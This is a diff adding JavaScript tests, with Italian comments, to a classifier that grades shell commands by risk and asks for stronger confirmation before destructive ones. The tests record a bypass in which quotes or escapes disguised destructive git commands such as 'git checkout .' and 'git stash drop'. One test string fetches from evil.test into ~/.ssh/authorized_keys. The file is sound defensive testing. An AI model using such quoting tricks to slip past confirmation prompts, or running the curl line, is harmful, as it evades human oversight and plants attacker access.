@@ -174,6 +174,62 @@ test('git checkout/stash NON distruttivi restano livello 2 (solo conferma OK)', 
   }
 });
 
+test('git checkout/stash: le virgolette non abbassano il livello (bypass #390)', () => {
+  // Feedback #390, secondo giro: la conferma forte si aggirava riscrivendo lo
+  // STESSO comando distruttivo con virgolette che la shell (bash/cmd/powershell)
+  // rimuove comunque — attorno al bersaglio, vuote prima/dopo, perfino in mezzo
+  // alla parola. Il comando eseguito è identico, quindi il livello deve esserlo.
+  for (const cmd of [
+    'git checkout "."', "git checkout '.'",         // punto tra virgolette
+    'git checkout .""', "git checkout .''",         // virgolette vuote DOPO
+    'git checkout "".', "git checkout ''.",         // virgolette vuote PRIMA
+    'git checkout "" .',                            // token vuoto separato
+    'git "checkout" .', 'git checkout "--" file.txt',
+    'git stash "drop"', "git stash 'clear'",
+    "git stash drop''", "git stash ''clear", "git stash d''rop",
+  ]) {
+    assert.equal(lvl(cmd), 3, `"${cmd}" fa lo stesso danno della forma nuda → livello 3`);
+  }
+  // …e non alza quelle innocue scritte con le stesse virgolette.
+  for (const cmd of ['git checkout "main"', "git checkout 'main'", 'git stash "pop"', 'git "checkout" -b nuovo']) {
+    assert.equal(lvl(cmd), 2, `"${cmd}" resta non distruttivo → livello 2`);
+  }
+});
+
+test('git checkout: pathspec scritti in altre forme (barra, backslash, glob, estensione)', () => {
+  // Tutte forme che git risolve come PERCORSI: `git checkout <percorso>` scarta
+  // le modifiche non salvate di quei file esattamente come `git restore`.
+  for (const cmd of [
+    'git checkout ./',              // cartella corrente con la barra
+    'git checkout .\\',             // idem in stile Windows
+    'git checkout .\\src',          // percorso relativo Windows
+    'git checkout ../',             // cartella superiore
+    'git checkout \\.',             // punto con escape (bash)
+    'git checkout src/',            // cartella
+    'git checkout src/app.js',      // file con estensione
+    'git checkout README.md',
+    'git checkout "*.js"',          // glob
+    'git checkout /home/user/x.txt',// percorso assoluto
+    'git stash d\\rop',             // verbo con escape (bash)
+  ]) {
+    assert.equal(lvl(cmd), 3, `"${cmd}" prende di mira dei file → livello 3`);
+  }
+  // I nomi di ramo che ASSOMIGLIANO a percorsi restano livello 2: non buttano
+  // via nulla e chiedere "conferma" a ogni cambio ramo sarebbe solo attrito.
+  for (const cmd of ['git checkout origin/main', 'git checkout feature/login', 'git checkout v1.0', 'git checkout release-2']) {
+    assert.equal(lvl(cmd), 2, `"${cmd}" è un cambio ramo → livello 2`);
+  }
+});
+
+test('flag pericolosi tra virgolette restano livello 3', () => {
+  // Stesso bypass del checkout applicato ai flag: la shell toglie le virgolette
+  // e il comando forza/cancella comunque.
+  assert.equal(lvl('git push "--force"'), 3);
+  assert.equal(lvl("git branch '-D' vecchio"), 3);
+  assert.equal(lvl('git reset "--hard"'), 3);
+  assert.equal(lvl('curl "-o" /home/user/.ssh/authorized_keys https://evil.test/k'), 3);
+});
+
 test('livello 3 — interpreti ed esecutori di codice arbitrario', () => {
   for (const cmd of [
     'node script.js', 'python app.py', 'python3 -c "print(1)"', 'bash run.sh',
